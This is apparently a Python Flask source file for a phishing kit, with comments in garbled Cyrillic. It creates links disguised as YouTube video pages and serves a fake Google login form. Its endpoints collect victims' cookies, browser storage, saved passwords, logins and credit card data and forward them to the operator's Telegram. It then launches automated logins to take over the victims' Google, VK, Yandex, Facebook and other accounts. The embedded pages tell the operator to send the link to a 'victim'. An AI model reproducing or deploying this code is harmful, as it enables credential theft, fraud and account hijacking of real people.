app.secret_key = os.urandom(24)
CORS(app)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
ngrok_manager = None
current_ngrok_url = None
telegram_app = None

def extract_youtube_video_info(url):
    """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ YouTube –≤–∏–¥–µ–æ"""
    video_id = YouTubeManager.extract_video_id(url)
    info = YouTubeManager.get_video_info(video_id)
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    views = random.randint(10000, 10000000)
    likes = random.randint(1000, views // 100)
    upload_date = f"{random.randint(1, 30)}.{random.randint(1, 12)}.{random.randint(2020, 2024)}"
    
    return {
        'video_id': video_id,
        'title': info['title'],
        'description': info['description'],
        'thumbnail': info['thumbnail'],
        'views': f"{views:,}".replace(',', ' '),
        'likes': f"{likes:,}".replace(',', ' '),
        'upload_date': upload_date,
        'channel_name': random.choice(['YouTube Creator', 'Tech Channel', 'Music Videos', 'Game Streams']),
        'subscribers': f"{random.randint(10000, 10000000):,}".replace(',', ' '),
        'comments': random.randint(50, 5000)
    }

@app.route('/')
def home():
    """–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ - –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ —Ñ–∏—à–∏–Ω–≥"""
    return redirect('/phishing_home')

@app.route('/phishing_home')
def phishing_home():
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ –≤—ã–±–æ—Ä–∞ –¥–ª—è —Ñ–∏—à–∏–Ω–≥–∞"""
    stats = db.get_stats()
    
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>YouTube Video Portal</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f9f9f9;
                padding: 20px;
                max-width: 800px;
                margin: 0 auto;
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
            }
            .stats {
                background: white;
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 20px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .link-form {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            input[type="text"] {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: 1px solid #ddd;
                border-radius: 5px;
                font-size: 16px;
            }
            button {
                background: #4285f4;
                color: white;
                border: none;
                padding: 12px 25px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
                width: 100%;
            }
            .instructions {
                margin-top: 30px;
                padding: 20px;
                background: #e8f4fd;
                border-radius: 10px;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>üé¨ YouTube Video Portal</h1>
            <p>–í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–∏</p>
        </div>
        
        <div class="stats">
            <h3>üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã</h3>
            <p>–í—Å–µ–≥–æ —Å–æ–∑–¥–∞–Ω–æ —Å—Å—ã–ª–æ–∫: <strong>""" + str(stats.get('total_links', 0)) + """</strong></p>
            <p>–í—Å–µ–≥–æ –ø–µ—Ä–µ—Ö–æ–¥–æ–≤: <strong>""" + str(stats.get('total_clicks', 0)) + """</strong></p>
            <p>–°–æ–±—Ä–∞–Ω–æ –¥–∞–Ω–Ω—ã—Ö: <strong>""" + str(stats.get('total_captured', 0)) + """</strong></p>
        </div>
        
        <div class="link-form">
            <h3>üîó –°–æ–∑–¥–∞—Ç—å —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É</h3>
            <form action="/create_phishing_link" method="POST">
                <input type="text" name="youtube_url" placeholder="https://youtube.com/watch?v=..." required>
                <button type="submit">–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É</button>
            </form>
        </div>
        
        <div class="instructions">
            <h3>üìã –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:</h3>
            <ol>
                <li>–í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ</li>
                <li>–ü–æ–ª—É—á–∏—Ç–µ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É</li>
                <li>–û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –¥—Ä—É–≥—É/–∑–Ω–∞–∫–æ–º–æ–º—É</li>
                <li>–ö–æ–≥–¥–∞ —á–µ–ª–æ–≤–µ–∫ –ø–µ—Ä–µ–π–¥–µ—Ç - –Ω–∞—á–Ω–µ—Ç—Å—è —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö</li>
                <li>–í—Å–µ –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏–¥—É—Ç –≤–∞–º –≤ Telegram</li>
                <li>–°–∏—Å—Ç–µ–º–∞ –ø–æ–ø—ã—Ç–∞–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤–æ–π—Ç–∏ –≤ –∞–∫–∫–∞—É–Ω—Ç—ã</li>
            </ol>
        </div>
    </body>
    </html>
    """
    
    return html_content

@app.route('/create_phishing_link', methods=['POST'])
def create_phishing_link():
    """–°–æ–∑–¥–∞–µ—Ç —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É"""
    youtube_url = request.form.get('youtube_url', '').strip()
    
    if not youtube_url:
        return "–û—à–∏–±–∫–∞: –ù–µ—Ç —Å—Å—ã–ª–∫–∏", 400
    
    # –ò–∑–≤–ª–µ–∫–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ
    video_info = extract_youtube_video_info(youtube_url)
    video_id = video_info['video_id']
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID
    link_id = str(uuid.uuid4())[:12]
    
    # –°–æ–∑–¥–∞–µ–º —Ñ–∏—à–∏–Ω–≥ URL
    if current_ngrok_url:
        phishing_url = YouTubeManager.generate_phishing_url(current_ngrok_url, video_id, link_id)
    else:
        phishing_url = f"http://localhost:{FLASK_PORT}/watch?v={video_id}&id={link_id}"
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
    link_data = {
        'id': link_id,
        'youtube_url': youtube_url,
        'youtube_id': video_id,
        'phishing_url': phishing_url,
        'created_at': datetime.now().isoformat(),
        'created_by': 0,  # –í —Ä–µ–∞–ª—å–Ω–æ–º –±–æ—Ç–µ –∑–¥–µ—Å—å –±—É–¥–µ—Ç ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        'title': video_info['title'],
        'description': video_info['description']
    }
    
    db.add_phishing_link(link_data)
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º HTML –æ—Ç–≤–µ—Ç
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background: #f9f9f9;
                padding: 40px;
                max-width: 800px;
                margin: 0 auto;
            }}
            .success-box {{
                background: white;
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 5px 20px rgba(0,0,0,0.1);
                text-align: center;
            }}
            .success-icon {{
                color: #34a853;
                font-size: 60px;
                margin-bottom: 20px;
            }}
            .phishing-url {{
                background: #f1f3f4;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                word-break: break-all;
                font-family: monospace;
            }}
            .copy-btn {{
                background: #4285f4;
                color: white;
                border: none;
                padding: 12px 25px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
                margin: 10px;
            }}
            .info-box {{
                background: #e8f4fd;
                padding: 20px;
                border-radius: 10px;
                margin-top: 30px;
                text-align: left;
            }}
        </style>
    </head>
    <body>
        <div class="success-box">
            <div class="success-icon">‚úÖ</div>
            <h1>–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ!</h1>
            
            <h3>–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ –≤–∏–¥–µ–æ:</h3>
            <p>{youtube_url[:80]}...</p>
            
            <h3>–ù–∞–∑–≤–∞–Ω–∏–µ –≤–∏–¥–µ–æ:</h3>
            <p>{video_info['title']}</p>
            
            <h3>–í–∞—à–∞ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∞:</h3>
            <div class="phishing-url" id="phishingUrl">{phishing_url}</div>
            
            <button class="copy-btn" onclick="copyToClipboard()">üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É</button>
            <a href="{phishing_url}" target="_blank"><button class="copy-btn">üîó –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É</button></a>
            
            <div class="info-box">
                <h4>üìã –ß—Ç–æ –¥–µ–ª–∞—Ç—å –¥–∞–ª—å—à–µ:</h4>
                <ol>
                    <li>–°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É –≤—ã—à–µ</li>
                    <li>–û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ (—á–µ—Ä–µ–∑ —Å–æ—Ü—Å–µ—Ç–∏, —Å–æ–æ–±—â–µ–Ω–∏—è –∏ —Ç.–¥.)</li>
                    <li>–ö–æ–≥–¥–∞ –∂–µ—Ä—Ç–≤–∞ –ø–µ—Ä–µ–π–¥–µ—Ç –ø–æ —Å—Å—ã–ª–∫–µ - –Ω–∞—á–Ω–µ—Ç—Å—è —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö</li>
                    <li>–í—Å–µ –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏–¥—É—Ç –≤ Telegram –±–æ—Ç</li>
                    <li>–°–∏—Å—Ç–µ–º–∞ –ø–æ–ø—ã—Ç–∞–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤–æ–π—Ç–∏ –≤ –∞–∫–∫–∞—É–Ω—Ç—ã –∂–µ—Ä—Ç–≤—ã</li>
                </ol>
                
                <h4>üîê –ß—Ç–æ –±—É–¥–µ—Ç —Å–æ–±—Ä–∞–Ω–æ:</h4>
                <ul>
                    <li>–í—Å–µ cookies –±—Ä–∞—É–∑–µ—Ä–∞</li>
                    <li>LocalStorage –∏ SessionStorage</li>
                    <li>–°–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∏ –ª–æ–≥–∏–Ω—ã</li>
                    <li>–î–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ–æ—Ä–º</li>
                    <li>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ</li>
                    <li>IP –∞–¥—Ä–µ—Å –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è</li>
                </ul>
            </div>
        </div>
        
        <script>
            function copyToClipboard() {{
                const url = document.getElementById('phishingUrl').innerText;
                navigator.clipboard.writeText(url).then(() => {{
                    alert('–°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞!');
                }});
            }}
        </script>
    </body>
    </html>
    """
    
    return html_content

@app.route('/watch')
def watch_page():
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ —Å YouTube –≤–∏–¥–µ–æ –¥–ª—è —Ñ–∏—à–∏–Ω–≥–∞"""
    video_id = request.args.get('v', 'dQw4w9WgXcQ')
    link_id = request.args.get('id', str(uuid.uuid4())[:12])
    
    # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –∫–ª–∏–∫–æ–≤
    db.increment_clicks(link_id)
    
    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ
    video_info = extract_youtube_video_info(f"https://youtube.com/watch?v={video_id}")
    
    # –ó–∞–º–µ–Ω—è–µ–º –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä—ã –≤ —à–∞–±–ª–æ–Ω–µ
    html_content = HTML_TEMPLATES["youtube_page"].format(
        youtube_id=video_id,
        link_id=link_id,
        server_url=current_ngrok_url or f"http://localhost:{FLASK_PORT}",
        video_title=video_info['title'],
        views_count=video_info['views'],
        upload_date=video_info['upload_date'],
        like_count=video_info['likes'],
        channel_name=video_info['channel_name'],
        subscribers_count=video_info['subscribers'],
        video_description=video_info['description'],
        comments_count=video_info['comments']
    )
    
    return html_content

@app.route('/login')
def login_page():
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ –≤—Ö–æ–¥–∞ –≤ Google"""
    link_id = request.args.get('link_id', '')
    service = request.args.get('service', 'google')
    
    if service == 'google':
        html_content = HTML_TEMPLATES["login_form"].format(
            link_id=link_id,
            server_url=current_ngrok_url or f"http://localhost:{FLASK_PORT}"
        )
        return html_content
    
    return "–°–µ—Ä–≤–∏—Å –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è", 404

@app.route('/login_success')
def login_success():
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—Ö–æ–¥–∞"""
    service = request.args.get('service', 'google')
    html_content = HTML_TEMPLATES["login_success"].format(service=service)
    return html_content

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö —Å –∫–ª–∏–µ–Ω—Ç–∞"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
        
        link_id = data.get('link_id')
        data_type = data.get('data_type', 'unknown')
        encoded_data = data.get('data')
        
        if not link_id or not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
        
        # –î–µ–∫–æ–¥–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ
        try:
            json_string = base64.b64decode(encoded_data).decode('utf-8')
            collected_data = json.loads(json_string)
        except Exception as e:
            logger.error(f"Error decoding data: {e}")
            return jsonify({'status': 'error', 'message': 'Decode error'}), 400
        
        # –ü–æ–ª—É—á–∞–µ–º IP –∞–¥—Ä–µ—Å
        ip_address = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–µ—Ä–≤–∏—Å—ã –∏–∑ –¥–∞–Ω–Ω—ã—Ö
        identified_services = []
        
        # –ò–∑ email –≤ –ª–æ–≥–∏–Ω–∞—Ö
        logins = collected_data.get('logins', [])
        for login in logins:
            email = login.get('value', '')
            if '@' in email:
                if '@gmail.com' in email or '@googlemail.com' in email:
                    identified_services.append('google')
                elif '@yandex.' in email or '@ya.ru' in email:
                    identified_services.append('yandex')
                elif '@mail.ru' in email or '@inbox.ru' in email:
                    identified_services.append('mailru')
                elif '@vk.com' in email:
                    identified_services.append('vk')
        
        # –ò–∑ cookies
        cookies = collected_data.get('cookies', {})
        cookies_list = [{'name': k, 'value': v} for k, v in cookies.items()]
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–µ—Ä–≤–∏—Å—ã –∏–∑ cookies
        for cookie in cookies_list:
            name = cookie['name'].lower()
            if 'google' in name:
                identified_services.append('google')
            elif 'facebook' in name or 'fb_' in name:
                identified_services.append('facebook')
            elif 'instagram' in name or 'ig_' in name:
                identified_services.append('instagram')
            elif 'twitter' in name or 'auth_token' in name:
                identified_services.append('twitter')
            elif 'vk' in name or 'vkontakte' in name:
                identified_services.append('vk')
            elif 'yandex' in name:
                identified_services.append('yandex')
        
        identified_services = list(set(identified_services))
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –¥–ª—è –±–∞–∑—ã
        data_id = str(uuid.uuid4())[:12]
        
        captured_data = {
            'id': data_id,
            'link_id': link_id,
            'timestamp': datetime.now().isoformat(),
            'ip_address': ip_address,
            'user_agent': collected_data.get('userAgent', ''),
            'cookies': cookies_list,
            'localStorage': collected_data.get('localStorage', {}),
            'sessionStorage': collected_data.get('sessionStorage', {}),
            'passwords': collected_data.get('passwords', []),
            'logins': collected_data.get('logins', []),
            'credit_cards': collected_data.get('creditCards', []),
            'autofill_data': collected_data.get('autofillData', {}),
            'browser_info': collected_data.get('browserInfo', {}),
            'device_info': {
                'screen': collected_data.get('screen', {}),
                'platform': collected_data.get('platform', ''),
                'timezone': collected_data.get('timezone', '')
            },
            'network_info': {
                'ip': ip_address
            },
            'sensitive_data': collected_data,
            'identified_services': identified_services
        }
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
        db.add_captured_data(captured_data)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
        if telegram_app:
            threading.Thread(
                target=send_notification_thread,
                args=(captured_data,),
                daemon=True
            ).start()
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ –µ—Å–ª–∏ –µ—Å—Ç—å –¥–∞–Ω–Ω—ã–µ
        if identified_services and (cookies_list or captured_data['passwords']):
            logger.info(f"Starting auto login for {data_id}")
            threading.Thread(
                target=run_auto_login,
                args=(captured_data,),
                daemon=True
            ).start()
        
        return jsonify({
            'status': 'success',
            'id': data_id,
            'message': 'Data collected successfully'
        })
        
    except Exception as e:
        logger.error(f"Error in collect_data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/collect_login', methods=['POST'])
def collect_login():
    """–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Ñ–æ—Ä–º—ã –≤—Ö–æ–¥–∞"""
    try:
        data = request.json
        link_id = data.get('link_id')
        encoded_data = data.get('data')
        
        if not link_id or not encoded_data:
            return jsonify({'status': 'error'}), 400
        
        # –î–µ–∫–æ–¥–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ
        json_string = base64.b64decode(encoded_data).decode('utf-8')
        login_data = json.loads(json_string)
        
        ip_address = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å
        data_id = str(uuid.uuid4())[:12]
        
        captured_data = {
            'id': data_id,
            'link_id': link_id,
            'timestamp': datetime.now().isoformat(),
            'ip_address': ip_address,
            'user_agent': login_data.get('userAgent', ''),
            'cookies': [],
            'passwords': [{
                'field': 'password',
                'value': login_data.get('password', ''),
                'form': 'google_login'
            }],
            'logins': [{
                'field': 'email',
                'value': login_data.get('email', ''),
                'type': 'email'
            }],
            'identified_services': ['google']
        }
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º
        db.add_captured_data(captured_data)
        
        # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
        if telegram_app:
            threading.Thread(
                target=send_notification_thread,
                args=(captured_data,),
                daemon=True
            ).start()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"Error in collect_login: {e}")
        return jsonify({'status': 'error'}), 500

def run_auto_login(captured_data):
    """–ó–∞–ø—É—Å–∫–∞–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç—ã"""
    try:
        logger.info(f"Starting auto login for data: {captured_data['id']}")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –¥–∞–Ω–Ω—ã—Ö
        if not captured_data.get('cookies') and not captured_data.get('passwords'):
            logger.info("No credentials for auto login")
            return
        
        # –°–æ–∑–¥–∞–µ–º –∫–æ–ø–∏—é –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ—Ç–æ–∫–∞
        manager = AutoLoginManager()
        if not manager.setup_driver():
            logger.error("Failed to setup driver for auto login")
            return
        
        results = manager.auto_login_all_services(captured_data)
        manager.close()
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        for result in results:
            if result:
                login_result = {
                    'data_id': captured_data['id'],
                    'service': result.get('service', 'unknown'),
                    'success': result.get('success', False),
                    'message': result.get('message', ''),
                    'account_info': result.get('account_info', {}),
                    'screenshot_path': result.get('screenshot_path'),
                    'timestamp': datetime.now().isoformat()
                }
                
                db.add_auto_login_result(login_result)
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram –µ—Å–ª–∏ —É—Å–ø–µ—à–Ω–æ
                if result.get('success'):
                    threading.Thread(
                        target=send_auto_login_notification_thread,
                        args=(login_result,),
                        daemon=True
                    ).start()
        
        logger.info(f"Auto login completed for {captured_data['id']}")
        
    except Exception as e:
        logger.error(f"Error in run_auto_login: {e}")

# ========== TELEGRAM –§–£–ù–ö–¶–ò–ò ==========
def send_notification_thread(data):
    """–ü–æ—Ç–æ–∫ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –≤ Telegram"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_telegram_notification(data))
        loop.close()
    except Exception as e:
        logger.error(f"Error in notification thread: {e}")

async def send_telegram_notification(data):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram –æ –Ω–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""
    try:
        if not telegram_app:
            return
        
        link_info = db.get_link(data['link_id'])
        link_url = link_info['phishing_url'] if link_info else 'N/A'
        
        message = f"""
üîê *–ù–û–í–´–ï –î–ê–ù–ù–´–ï –ó–ê–•–í–ê–ß–ï–ù–´!*

üìå *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Å—Å–∏–∏:*
‚Ä¢ ID –¥–∞–Ω–Ω—ã—Ö: `{data['id']}`
‚Ä¢ ID —Å—Å—ã–ª–∫–∏: `{data['link_id']}`
‚Ä¢ –í—Ä–µ–º—è: {data['timestamp'][:19]}
‚Ä¢ IP: `{data['ip_address']}`
‚Ä¢ User Agent: {data['user_agent'][:50]}...

üìä *–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:*
‚Ä¢ Cookies: {len(data.get('cookies', []))}
‚Ä¢ –õ–æ–≥–∏–Ω—ã: {len(data.get('logins', []))}
‚Ä¢ –ü–∞—Ä–æ–ª–∏: {len(data.get('passwords', []))}
‚Ä¢ LocalStorage: {len(data.get('localStorage', {}))}
‚Ä¢ SessionStorage: {len(data.get('sessionStorage', {}))}

üåê *–û–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã:*
"""
        
        services = data.get('identified_services', [])
        if services:
            for service in services:
                message += f"‚Ä¢ {service.title()}\n"
        else:
            message += "‚Ä¢ –ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã\n"
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ª–æ–≥–∏–Ω—ã –µ—Å–ª–∏ –µ—Å—Ç—å
        logins = data.get('logins', [])
        if logins:
            message += "\nüë§ *–ù–∞–π–¥–µ–Ω–Ω—ã–µ –ª–æ–≥–∏–Ω—ã:*\n"
            for login in logins[:3]:
                value = login.get('value', '')
                if '@' in value:
                    message += f"‚Ä¢ `{value}`\n"
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–∞—Ä–æ–ª–∏ –µ—Å–ª–∏ –µ—Å—Ç—å
        passwords = data.get('passwords', [])
        if passwords:
            message += "\nüîë *–ù–∞–π–¥–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏:*\n"
            for pwd in passwords[:2]:
                message += f"‚Ä¢ `{pwd.get('value', '')}`\n"
        
        stats = db.get_stats()
        message += f"""
üöÄ *–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥:* –ó–∞–ø—É—â–µ–Ω –¥–ª—è {len(services)} —Å–µ—Ä–≤–∏—Å–æ–≤

üìà *–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã:*
‚Ä¢ –í—Å–µ–≥–æ –¥–∞–Ω–Ω—ã—Ö: {stats.get('total_captured', 0)}
‚Ä¢ –£—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π: {stats.get('total_credentials', 0)}
‚Ä¢ –£—Å–ø–µ—à–Ω—ã—Ö –≤—Ö–æ–¥–æ–≤: {stats.get('auto_login_success', 0)}

üí° *–ö–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /data {data['id']} - –î–µ—Ç–∞–ª–∏ –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /auto_login {data['id']} - –ü–æ–ø—ã—Ç–∫–∞ –≤—Ö–æ–¥–∞
‚Ä¢ /stats - –ü–æ–ª–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
"""
        
        await telegram_app.bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )
        
    except Exception as e:
        logger.error(f"Error sending Telegram notification: {e}")

def send_auto_login_notification_thread(result):
    """–ü–æ—Ç–æ–∫ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ–± —É—Å–ø–µ—à–Ω–æ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–º –≤—Ö–æ–¥–µ"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_auto_login_notification(result))
        loop.close()
    except Exception as e:
        logger.error(f"Error in auto login notification thread: {e}")

async def send_auto_login_notification(result):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–º –≤—Ö–æ–¥–µ"""
    try:
        if not result.get('success'):
            return
        
        message = f"""
‚úÖ *–£–°–ü–ï–®–ù–´–ô –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò–ô –í–•–û–î!*

üéØ *–°–µ—Ä–≤–∏—Å:* {result['service'].title()}
üìä *–†–µ–∑—É–ª—å—Ç–∞—Ç:* –£—Å–ø–µ—à–Ω–æ
üë§ *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ:*
"""
        
        account_info = result.get('account_info', {})
        if account_info.get('email'):
            message += f"‚Ä¢ Email: `{account_info['email']}`\n"
        if account_info.get('name'):
            message += f"‚Ä¢ –ò–º—è: {account_info['name']}\n"
        if account_info.get('url'):
            message += f"‚Ä¢ URL: {account_info['url']}\n"
        
        message += f"""
üìÖ *–í—Ä–µ–º—è –≤—Ö–æ–¥–∞:* {result['timestamp'][:19]}
üîó *–î–∞–Ω–Ω—ã–µ ID:* `{result['data_id']}`

üöÄ *–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω –Ω–∞ –≤–∞—à–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ!*
–ê–∫–∫–∞—É–Ω—Ç —Ç–µ–ø–µ—Ä—å –¥–æ—Å—Ç—É–ø–µ–Ω –≤ –≤–∞—à–µ–º –±—Ä–∞—É–∑–µ—Ä–µ.
"""
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –µ—Å–ª–∏ –µ—Å—Ç—å
        if result.get('screenshot_path') and os.path.exists(result['screenshot_path']):
            with open(result['screenshot_path'], 'rb') as photo:
                await telegram_app.bot.send_photo(
                    chat_id=ADMIN_ID,
                    photo=photo,
                    caption=message,
                    parse_mode=ParseMode.MARKDOWN
